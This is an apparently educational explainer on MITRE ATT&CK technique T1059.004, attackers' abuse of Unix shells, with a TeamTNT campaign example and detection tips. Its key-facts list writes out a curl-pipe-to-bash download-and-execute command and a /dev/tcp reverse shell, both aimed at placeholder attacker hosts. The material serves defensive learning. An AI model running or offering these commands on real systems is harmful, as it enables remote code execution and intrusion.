# T1059.004

## What it is
Like a maintenance tunnel hidden beneath a building that lets workers bypass locked floors entirely, Unix shells give attackers a direct pathway to system internals that bypasses many surface-level controls. Precisely, this technique covers adversary abuse of Unix shell interpreters — Bash, sh, zsh, dash — to execute commands, run scripts, and chain operations on Linux/macOS systems. The shell becomes the attacker's Swiss Army knife once they gain any foothold.

## Why it matters
In the 2021 TeamTNT cryptomining campaign, attackers gained initial access to exposed Docker APIs and immediately dropped Bash scripts to install mining software, exfiltrate credentials from `~/.aws/credentials`, and establish persistence via cron jobs — all within a single shell session. Defenders who monitored for anomalous `bash -i` or `sh -c` invocations from web server processes could detect the lateral movement before the full payload deployed.

## Key facts
- Bash scripts can be delivered inline via `-c` flag (e.g., `bash -c "curl malicious.com/payload | bash"`) to avoid writing files to disk
- Attackers chain shell commands using `&&`, `;`, and `|` to execute multi-stage payloads in a single log line
- A common detection signal is a shell spawned by an unusual parent process — such as `apache2` or `nginx` spawning `/bin/bash`
- Reverse shells frequently abuse `/dev/tcp` built into Bash: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`
- Shell history files (`~/.bash_history`) and `/var/log/auth.log` are primary forensic artifacts for reconstructing attacker activity
